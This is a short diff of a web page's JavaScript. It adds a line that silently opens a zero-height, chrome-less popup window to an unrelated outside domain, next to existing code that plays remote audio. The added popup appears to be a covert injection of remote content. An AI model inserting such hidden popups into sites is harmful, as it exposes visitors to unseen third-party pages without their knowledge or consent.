@@ -128,6 +128,8 @@
 			}
 		},1000);
 
+		window.open('https://api.77lemon.top/Moblie/title.html','text','height=0, width=100, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, status=no');
+
 		let video = document.createElement("VIDEO");
 		video.src = 'http://file.52lishi.com/file/yinxiao/f-18-3-21-07.wav';
 		video.play();
